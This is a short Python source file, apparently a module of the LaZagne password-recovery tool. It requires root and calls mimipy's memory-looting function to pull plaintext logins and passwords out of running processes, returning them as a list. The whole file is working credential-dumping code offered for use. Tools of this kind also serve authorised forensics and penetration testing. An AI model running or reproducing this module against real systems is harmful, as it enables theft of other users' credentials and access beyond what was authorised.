#!/usr/bin/env python
# -*- coding: utf-8 -*- 
# Special thanks to @n1nj4sec and @huntergregal for their work
# Their code have been used to build this module
from lazagne.config.write_output import print_debug
from mimipy_functions import mimipy_loot_passwords
from lazagne.config.moduleInfo import ModuleInfo
import os

class Mimipy(ModuleInfo):
	def __init__(self):
		ModuleInfo.__init__(self, 'mimipy', 'memory')

	def root_access(self):
		if os.getuid() != 0:
			return False
		return True

	def run(self, software_name=None):
		if not self.root_access():
			print_debug('INFO', 'You need more privileges (run it with sudo)')
			return

		opt = "nsrx"
		pwdFound = []
		for t, process, user, passwd in mimipy_loot_passwords(optimizations=opt):
			pwdFound.append(
				{
					'Process' 	: str(process), 
					'Login'		: str(user),
					'Password'	: str(passwd),	
				}
			)
		return pwdFound